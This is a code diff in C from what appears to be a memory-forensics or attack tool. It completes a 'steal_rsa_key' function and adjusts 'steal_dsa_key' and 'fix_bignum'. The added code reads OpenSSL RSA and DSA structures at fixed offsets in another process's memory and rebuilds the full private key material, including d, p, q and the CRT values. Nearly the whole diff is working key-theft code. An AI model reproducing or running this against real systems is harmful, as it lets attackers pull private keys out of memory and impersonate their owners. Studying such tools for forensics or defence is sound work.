@@ -193,6 +193,12 @@ BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 	printf("\t\t\t\tfix bignum @0x%08x: ", (uint32_t)rb);
 	p = (uint32_t)rb;
 	p &= 0xffffffff;
+
+	if(!p) {
+		printf("possibly ok...\n");
+		return NULL;
+	}
+
 	b = calloc(1, sizeof(BIGNUM));
 
 	if(   linear_read(lin, p   , &(b->d), 4)
@@ -234,9 +240,75 @@ BIGNUM* fix_bignum(linear_handle lin, BIGNUM* rb)
 
 int steal_rsa_key(linear_handle lin, Key* key)
 {
-	// TODO
-	lin = 0;
-	key = 0;
+	addr_t p;
+
+	if(!key->rsa)
+		return 0;
+
+	p = (uint32_t)key->rsa;
+	p &= 0xffffffff;
+
+	key->rsa = calloc(1, sizeof(RSA));
+
+	if(   linear_read(lin, p   , &(key->rsa->pad), 4)
+	   || linear_read(lin, p+4 , &(key->rsa->version), 4)
+	   //                   +8  : *meth : who cares
+	   //                   +12 : *engine: who cares
+	   || linear_read(lin, p+16 , &(key->rsa->n), 4)
+	   || linear_read(lin, p+20 , &(key->rsa->e), 4)
+	   || linear_read(lin, p+24 , &(key->rsa->d), 4)
+	   || linear_read(lin, p+28 , &(key->rsa->p), 4)
+	   || linear_read(lin, p+32 , &(key->rsa->q), 4)
+	   || linear_read(lin, p+36 , &(key->rsa->dmp1), 4)
+	   || linear_read(lin, p+40 , &(key->rsa->dmq1), 4)
+	   || linear_read(lin, p+44 , &(key->rsa->iqmp), 4)
+	   || linear_read(lin, p+56 , &(key->rsa->flags), 4)) {
+		free(key->rsa);
+		key->rsa = NULL;
+		return 0;
+	}
+	// don't care for anything else.
+	
+#ifdef __BIG_ENDIAN__
+	key->rsa->pad = endian_swap32(key->rsa->pad);
+	key->rsa->version = endian_swap32(key->rsa->version);
+
+	key->rsa->n = (BIGNUM*)endian_swap32((uint32_t) key->rsa->n);
+	key->rsa->e = (BIGNUM*)endian_swap32((uint32_t) key->rsa->e);
+	key->rsa->d = (BIGNUM*)endian_swap32((uint32_t) key->rsa->d);
+	key->rsa->p = (BIGNUM*)endian_swap32((uint32_t) key->rsa->p);
+	key->rsa->q = (BIGNUM*)endian_swap32((uint32_t) key->rsa->q);
+	key->rsa->dmp1 = (BIGNUM*)endian_swap32((uint32_t) key->rsa->dmp1);
+	key->rsa->dmq1 = (BIGNUM*)endian_swap32((uint32_t) key->rsa->dmq1);
+	key->rsa->iqmp = (BIGNUM*)endian_swap32((uint32_t) key->rsa->iqmp);
+
+	key->rsa->flags = endian_swap32(key->rsa->flags);
+#endif
+
+	printf("\t\t\tRSA: pad:%d version:%d flags:%d data: %p %p %p %p %p  %p %p %p\n",
+		key->rsa->pad, key->rsa->version, key->rsa->flags, key->rsa->n, key->rsa->e, key->rsa->d, key->rsa->p, key->rsa->q,   key->rsa->dmp1, key->rsa->dmq1, key->rsa->iqmp);
+
+	key->rsa->n = fix_bignum(lin, key->rsa->n);
+	key->rsa->e = fix_bignum(lin, key->rsa->e);
+	key->rsa->d = fix_bignum(lin, key->rsa->d);
+	key->rsa->p = fix_bignum(lin, key->rsa->p);
+	key->rsa->q = fix_bignum(lin, key->rsa->q);
+	
+	key->rsa->dmp1 = fix_bignum(lin, key->rsa->dmp1);
+	key->rsa->dmq1 = fix_bignum(lin, key->rsa->dmq1);
+	key->rsa->iqmp = fix_bignum(lin, key->rsa->iqmp);
+
+	if(key->rsa->n && key->rsa->e && key->rsa->d && key->rsa->p && key->rsa->q && key->rsa->dmp1 && key->rsa->dmq1 && key->rsa->iqmp) {
+		printf("\t\t\t" "\x1b[1;32m" "OK." "\x1b[0m" "\n");
+		return 1;
+	} else {
+		// TODO: free BIGNUMs
+		free(key->rsa);
+		key->rsa = NULL;
+		printf("\t\t\t" "\x1b[1;31m" "failed to recover bignums." "\x1b[0m" "\n");
+		return 0;
+	}
+
 	return 0;
 }
 
@@ -248,10 +320,9 @@ int steal_dsa_key(linear_handle lin, Key* key)
 		return 0;
 
 	p = (uint32_t)key->dsa;
+	p &= 0xffffffff;
 
 	key->dsa = calloc(1,sizeof(DSA));
-
-//	DSA_generate_key( key->dsa );
 
 	if(   linear_read(lin, p   , &(key->dsa->pad), 4)
 	   || linear_read(lin, p+4 , &(key->dsa->version), 4)
@@ -266,7 +337,7 @@ int steal_dsa_key(linear_handle lin, Key* key)
 		key->dsa = NULL;
 		return 0;
 	}
-	key->dsa->references = 1;
+	key->dsa->references = 0;
 	// don't care for the rest
 	//  p+36  method_mont_p (?)
 	//  p+40  references (?)
@@ -300,6 +371,7 @@ int steal_dsa_key(linear_handle lin, Key* key)
 		printf("\t\t\t" "\x1b[1;32m" "OK." "\x1b[0m" "\n");
 		return 1;
 	} else {
+		// TODO: free BIGNUMs
 		free(key->dsa);
 		key->dsa = NULL;
 		printf("\t\t\t" "\x1b[1;31m" "failed to recover bignums." "\x1b[0m" "\n");
